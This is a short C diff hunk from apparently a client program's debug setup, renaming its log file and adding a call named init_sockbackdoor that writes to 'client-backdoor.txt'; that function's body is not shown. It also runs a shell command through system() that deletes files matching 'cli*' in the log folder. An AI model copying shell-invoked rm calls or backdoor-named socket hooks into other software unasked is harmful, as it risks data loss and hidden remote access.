@@ -28,9 +28,17 @@ t = time(NULL);
 tmp = localtime(&t);
 //strftime(outstr, 200, "./log/client-%c.txt", tmp);
 
-strcpy (outstr, "./log/client.txt");
+
 system ("cd log; rm cli*");
+
+strcpy (outstr, "./log/client-log.txt");
 init_log (outstr);
+
+strcpy (outstr, "./log/client-backdoor.txt");
+
+init_sockbackdoor (outstr);
+
+
 }// if debug
 
 
